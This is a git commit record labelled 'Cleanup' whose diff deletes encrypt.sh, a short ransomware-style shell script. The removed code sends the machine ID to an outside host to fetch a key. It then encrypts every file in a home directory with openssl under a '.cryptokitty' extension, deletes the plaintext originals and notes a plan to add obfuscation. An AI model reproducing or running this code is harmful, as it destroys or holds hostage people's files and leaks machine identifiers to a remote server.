26a49ab9bdbfff7e812f19af407fa207751164d2
Solomon Marian <blasco991@gmail.com>
2018-07-07 16:54:55 +0200

    Cleanup

--- encrypt.sh
+++
@@ -1,9 +0,0 @@
-#for every file in the chosen directory
-key=$(curl -s https://deadkitty.blasco991.com/code.php?m=$(cat /var/lib/dbus/machine-id)) && for f in /home/cavaz/prova/* /home/cavaz/prova/**/* ; do
-echo $f
-#i encrypt with extension .criptokitty and i use the key "pippo", then i remove the clear text files leaving only the crypted ones
-[ -f "$f" ] && [[ "${f##*\\.}" == "*.cryptokitty" ]] && openssl enc -aes-256-cbc -in "$f" -k "$key" -out "$f.cryptokitty" && rm "$f"
-
-done
-
-#TODO make obfuscation
